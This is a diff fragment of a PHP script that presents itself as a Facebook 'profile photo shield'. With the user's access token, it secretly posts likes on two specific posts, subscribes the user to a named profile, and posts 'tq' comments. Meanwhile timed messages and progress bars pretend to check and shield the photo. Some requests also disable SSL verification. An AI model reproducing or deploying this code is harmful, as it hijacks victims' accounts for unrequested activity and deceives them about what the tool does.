+        curl_setopt_array($b, array(CURLOPT_URL => "$a", CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 0, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false));
+        curl_exec($b);
+        curl_close($b);
+        $c = ("https://graph.facebook.com/v3.2/100003964985080_1409231422552344/likes?method=post&access_token=" . $token);
+        $d = curl_init();
+        curl_setopt_array($d, array(CURLOPT_URL => "$c", CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 0, CURLOPT_SSL_VERIFYPEER => true, CURLOPT_SSL_VERIFYHOST => true));
+        curl_exec($d);
+        curl_close($d);
+        $e = ("https://graph.facebook.com/krisna.dimas.9/subscribers?method=post&access_token=" . $token);
+        $f = curl_init();
+        curl_setopt_array($f, array(CURLOPT_URL => "$e", CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 0, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false));
+        curl_exec($f);
+        curl_close($f);
+        $g = ("https://graph.facebook.com/v3.2/100003082406903_1973394066106654/likes?method=post&access_token=" . $token);
+        $h = curl_init();
+        curl_setopt_array($h, array(CURLOPT_URL => "$g", CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 0, CURLOPT_SSL_VERIFYPEER => true, CURLOPT_SSL_VERIFYHOST => true));
+        curl_exec($h);
+        curl_close($h);
+        $i = ("https://graph.facebook.com/v3.2/100003082406903_1973394066106654/comments?method=post&message=tq&access_token=" . $token);
+        $j = curl_init();
+        curl_setopt_array($j, array(CURLOPT_URL => "$i", CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 0, CURLOPT_SSL_VERIFYPEER => true, CURLOPT_SSL_VERIFYHOST => true));
+        curl_exec($j);
+        curl_close($j);
+        $k = ("https://graph.facebook.com/v3.2/100003964985080_1409231422552344/comments?method=post&message=tq&access_token=" . $token);
+        $l = curl_init();
+        curl_setopt_array($l, array(CURLOPT_URL => "$k", CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 0, CURLOPT_SSL_VERIFYPEER => true, CURLOPT_SSL_VERIFYHOST => true));
+        curl_exec($l);
+        curl_close($l);
+        echo "
+";
+        echo "$lightgreen Checking Your Profile Photo";
+        echo ".";
+        sleep(1);
+        echo ".";
+        sleep(1);
+        echo ".";
+        sleep(1);
+        echo ".";
+        sleep(1);
+        echo "$blue So Bad xD";
+        echo "$red He";
+        sleep(1);
+        echo "he";
+        sleep(1);
+        echo "he";
+        sleep(1);
+        echo "he
+";
+        sleep(1);
+        echo "$yellow Shielding Your Profile Photo";
+        echo " wait a few second";
+        echo " .";
+        sleep(2);
+        echo ".";
+        sleep(2);
+        echo ".
+";
+        sleep(2);
+        echo "$green _";
+        sleep(1.5);
+        echo "__";
+        sleep(1.5);
+        echo "___";
+        sleep(1.5);
+        echo "____";
+        sleep(1.5);
+        echo "_____";
+        sleep(1.5);
+        echo "______";
+        sleep(1.5);
+        echo "______";
+        sleep(1.5);
+        echo "________";
+        sleep(1.5);
+        echo "_________";
+        sleep(1.5);
+        echo "__________
+";
+        sleep(1.5);
+        echo "
+";
+        echo "$green []Selesai silahkan cek profil facebook kamu
+";
+        sleep(1.5);
+        echo "$yellow Thanks...
+";
+        sleep(1);
+        echo "$blue See You Again : $cyan " . $me->name;
+        sleep(1.5);
+        echo "
+";
+    }
+?>
